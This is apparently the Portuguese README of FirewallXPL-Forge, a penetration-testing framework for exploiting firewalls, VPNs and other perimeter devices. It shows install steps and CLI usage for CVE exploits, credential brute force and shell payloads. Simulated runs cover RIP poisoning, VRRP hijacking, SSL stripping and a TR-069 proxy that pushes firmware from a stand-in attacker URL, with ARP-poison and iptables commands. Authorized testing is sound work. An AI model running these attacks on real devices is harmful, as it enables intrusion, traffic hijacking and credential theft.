# FirewallXPL-Forge

**Framework de exploração de segurança perimetral** - 164 módulos cobrindo **FW, NGFW, UTM, WAF, VPN, NAC, LB** e firewalls industriais **OT/ICS** em **23 vendors** e **51+ CVEs**.

**Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)

**Idioma:** **Português (pt-BR)** - esta página. **English (en-US, default):** [README.md](README.md)

[![Python 3.9–3.13](https://img.shields.io/badge/Python-3.9--3.13-blue.svg)](https://www.python.org/downloads/)
[![CI](https://github.com/mrhenrike/FirewallXPL-Forge/actions/workflows/compat-matrix.yml/badge.svg)](https://github.com/mrhenrike/FirewallXPL-Forge/actions)
[![PyPI](https://img.shields.io/pypi/v/firewallxpl.svg)](https://pypi.org/project/firewallxpl/)

---

## Arquitetura e Mapa de Superfície de Ataque

![FirewallXPL-Forge v2.0.0 - Mapa de Superfície de Ataque](docs/diagrams/architecture/attack-surface-map-v2.0.0.png)

---

## Instalação

```bash
# Via PyPI (recomendado)
pip install firewallxpl

# Com TUI Rich + descoberta Nmap
pip install firewallxpl[tui,discovery]

# Com engine ML + aceleração GPU
pip install firewallxpl[ml,gpu-nvidia]

# Tudo incluído
pip install firewallxpl[full]

# A partir do código-fonte
git clone https://github.com/mrhenrike/FirewallXPL-Forge.git
cd FirewallXPL-Forge
pip install -e ".[tui,discovery]"
python fxf.py
```

---

## O que o projeto faz

FirewallXPL-Forge fornece **módulos** para testes de segurança **autorizados** contra dispositivos de perímetro (pentest, laboratório, red team controlado). Classes alvo: `perimeter`, `waf`, `vpn`, `nac`, `lb`.

| Tipo | Função |
|------|--------|
| **exploits** | Exploração de vulnerabilidades conhecidas - `check()` + `run()` por módulo |
| **creds** | Credenciais default e brute force via SSH, FTP, Telnet, HTTP, SNMP |
| **scanners** | Identificação de fraquezas; **AutoPwn** orquestra todos os módulos com timing Nmap (T0-T5) |
| **payloads** | Geração de payloads por arquitetura (ARM/MIPS/x86/x64, reverse/bind shells) |
| **encoders** | Codificação de payloads (Python, PHP, Perl) |

---

## Uso

### Shell interativo

```bash
python fxf.py
```

```text
fxf > use exploits/perimeter/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379
fxf (...) > set target 192.168.1.1
fxf (...) > check
[+] Alvo é vulnerável
fxf (...) > run
```

### AutoPwn com ML

```text
fxf > use scanners/autopwn
fxf (scanners/autopwn) > set target 192.168.1.1
fxf (scanners/autopwn) > set timing_template aggressive
fxf (scanners/autopwn) > set ml_advisor true
fxf (scanners/autopwn) > run
```

### Modo não-interativo

```bash
python fxf.py -m exploits/perimeter/fortinet/fortios_auth_bypass_cve_2022_40684 -s "target 10.0.0.1"
python fxf.py -m exploits/perimeter/paloalto/globalprotect_auth_bypass_cve_2026_0257 -s "target vpn.alvo.com" -s "forge_user admin"
```

### Instalador de scripts NSE

Instale os scripts Nmap especializados em firewalls embutidos no pacote:

```bash
# Modo interativo
fxf > install-nse

# Modo não-interativo (requer nmap no PATH)
python fxf.py -c "install-nse"

# Caminho personalizado ou simulação
python fxf.py -c "install-nse --path /usr/local/share/nmap/scripts"
python fxf.py -c "install-nse --check"
```

**Scripts embutidos:**

| Script | Finalidade |
|--------|-----------|
| `fxf-firewall-fingerprint.nse` | Fingerprinting genérico de firewall (11 vendors) |
| `fxf-globalprotect-detect.nse` | Detecção de portal/gateway Palo Alto GlobalProtect |
| `fxf-globalprotect-auth-bypass-cve-2026-0257.nse` | Verificação passiva de CVE-2026-0257 |
| `fxf-fortios-detect.nse` | Detecção de Fortinet FortiOS |
| `fxf-cisco-asa-detect.nse` | Detecção de Cisco ASA/FTD |

```bash
# Após instalar: use o nmap diretamente
nmap -p 443 --script fxf-globalprotect-auth-bypass-cve-2026-0257 <alvo>
nmap -p 443,80,8443 --script fxf-firewall-fingerprint 192.168.0.0/24
```

Consulte [docs/wiki/pt-BR/12-scripts-nse.md](docs/wiki/pt-BR/12-scripts-nse.md) para a referência completa de NSE.

---

## Engines

| Engine | Descrição |
|--------|-----------|
| **Concorrência Async** | asyncio + ThreadPool (até 300 threads) + ProcessPool + ConnectionPool + Pipeline |
| **Aceleração GPU** | NVIDIA CUDA, AMD ROCm, Intel oneAPI, Apple Metal, OpenCL, CPU fallback |
| **Engine ML** | Fingerprinter, AttackOptimizer (Thompson Sampling), AnomalyDetector, AutoTuner |
| **Network Discovery** | Integração Nmap/Masscan + fallback TCP + identificação de dispositivos (23 vendors) |
| **TUI Rich** | Banner estilizado, painéis, tabelas, progress bars, dashboard |

---

## Documentação

- **Wiki (en-US + pt-BR):** [github.com/mrhenrike/FirewallXPL-Forge/wiki](https://github.com/mrhenrike/FirewallXPL-Forge/wiki)

---

## BLOCO J - Categorias de Ataque (v2.0.0)

> **AVISO LEGAL:** Todos os módulos desta seção são destinados **exclusivamente a testes de segurança autorizados, pesquisa e uso educacional**. A execução contra firewalls ou roteadores em produção sem autorização expressa e por escrito configura crime federal. Os autores e a União Geek não assumem responsabilidade por uso indevido.

### Ataques de Roteamento

> **AVISO:** Ataques de injeção de rota redirecionam tráfego de rede e podem interromper a segurança de perímetro e os serviços em produção. Apenas para laboratório autorizado.

```bash
fxf > use exploits/routing/rip_v1_poison
fxf (RIPv1Poison) > set src_ip 192.168.1.100
fxf (RIPv1Poison) > set poison_network 0.0.0.0
fxf (RIPv1Poison) > set metric 1
fxf (RIPv1Poison) > set destination 255.255.255.255
fxf (RIPv1Poison) > set simulate true
fxf (RIPv1Poison) > run

[SIMULATE] Enviaria RIPv1 Response para 255.255.255.255:520
[SIMULATE] Rede: 0.0.0.0 (rota padrão) metrica=1 next-hop=192.168.1.100
[SIMULATE] Payload (24 bytes): 0201000000020000...
[SIMULATE] Explora CVE-1999-0111: RIPv1 não possui autenticação
[SIMULATE] Efeito: roteadores sem autenticação instalam rota padrão via atacante
[!] Set simulate false + destructive true para executar
```

```bash
fxf > use exploits/routing/vrrp_hijack
fxf (VRRPHijack) > set src_ip 192.168.1.100
fxf (VRRPHijack) > set vrid 1
fxf (VRRPHijack) > set virtual_ip 192.168.1.1
fxf (VRRPHijack) > set priority 255
fxf (VRRPHijack) > set simulate true
fxf (VRRPHijack) > run

[SIMULATE] Enviaria 5 Advertisement(s) VRRP
[SIMULATE]   VRID=1 prioridade=255 virtual_ip=192.168.1.1 advert_int=1s
[SIMULATE]   src=192.168.1.100 -> dst=224.0.0.18 (IP proto 112)
[SIMULATE]   Payload VRRP (16 bytes): 21012001...
[SIMULATE] Efeito: master VRRP atual cede; atacante torna-se roteador ativo para 192.168.1.1
[!] PRÉ-REQUISITO: Scapy + privilégios de raw socket (root Linux) ou admin Windows
```

| Módulo | Caminho | Impacto | Referência |
|--------|---------|---------|-----------|
| `rip_v1_poison` | `exploits/routing/` | ALTO | CVE-1999-0111, RFC 1058 |
| `vrrp_hijack` | `exploits/routing/` | ALTO | RFC 3768, MITRE T1557 |

### Proxies MiTM

> **AVISO:** Módulos de proxy MiTM interceptam e potencialmente modificam o tráfego de gerenciamento de dispositivos de rede. Podem expor credenciais e permitir alterações de configuração não autorizadas. Requer ARP poisoning como pré-requisito.

```bash
fxf > use exploits/mitm/tr069_mitm_proxy
fxf (TR069MiTM) > set acs_host 10.0.0.1
fxf (TR069MiTM) > set acs_port 7547
fxf (TR069MiTM) > set listen_port 7547
fxf (TR069MiTM) > set inject_mode firmware
fxf (TR069MiTM) > set firmware_url http://atacante/firmware-malicioso.bin
fxf (TR069MiTM) > set simulate true
fxf (TR069MiTM) > run

[SIMULATE] Ligaria proxy CWMP em 0.0.0.0:7547
[SIMULATE]   ACS upstream: 10.0.0.1:7547 (ssl=False)
[SIMULATE]   Modo de injeção: inject Download RPC para http://atacante/firmware-malicioso.bin
[SIMULATE] Configuração necessária:
[SIMULATE]   1. ARP poison no CPE para redirecionar porta 7547 ao atacante
[SIMULATE]   2. iptables -t nat -A PREROUTING -p tcp --dport 7547 -j REDIRECT --to-port 7547
[!] Set simulate false + destructive true para iniciar o proxy
```

```bash
fxf > use exploits/mitm/ssl_strip_embedded
fxf (SSLStrip) > set target 192.168.1.1
fxf (SSLStrip) > set target_port 443
fxf (SSLStrip) > set listen_port 10080
fxf (SSLStrip) > set simulate true
fxf (SSLStrip) > run

[SIMULATE] Ligaria proxy SSL strip em 0.0.0.0:10080
[SIMULATE]   Alvo upstream: 192.168.1.1:443 (use_ssl_upstream=True)
[SIMULATE]   Todas as referências HTTPS convertidas para HTTP nas respostas
[SIMULATE]   Credenciais, cookies e headers de autorização registrados em texto simples
[SIMULATE] Configuração necessária:
[SIMULATE]   1. ARP poison no alvo: arp -s <ip_alvo> <mac_atacante>
[SIMULATE]   2. iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10080
[!] Set simulate false + destructive true para iniciar o proxy
```

| Módulo | Caminho | Impacto | Referência |
|--------|---------|---------|-----------|
| `tr069_mitm_proxy` | `exploits/mitm/` | CRÍTICO | TR-069 Amendment 6, CVE-2014-9222 |
| `ssl_strip_embedded` | `exploits/mitm/` | ALTO | BlackHat DC 2009 (Marlinspike), MITRE T1557.002 |

### Resumo de Cobertura

| Categoria | Módulos | Modo Padrão |
|-----------|---------|------------|
| Ataques de Roteamento | `rip_v1_poison`, `vrrp_hijack` | simulate=True |
| Proxies MiTM | `tr069_mitm_proxy`, `ssl_strip_embedded` | simulate=True |
| Exploits de Perímetro | `fortios_sslvpn_session_reuse`, `cisco_asa_ftd_firestarter_chain`, + 10+ | simulate=True |
| Credenciais | `perimeter_auth_bruteforce` | simulate=True |

Todos os módulos utilizam `simulate=True` por padrão. A execução ao vivo requer `destructive=True` definido explicitamente após revisar a saída simulada.

---

## Licença

BSD - ver [LICENSE](LICENSE).

---

> **Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | **União Geek** - [https://github.com/Uniao-Geek](https://github.com/Uniao-Geek)
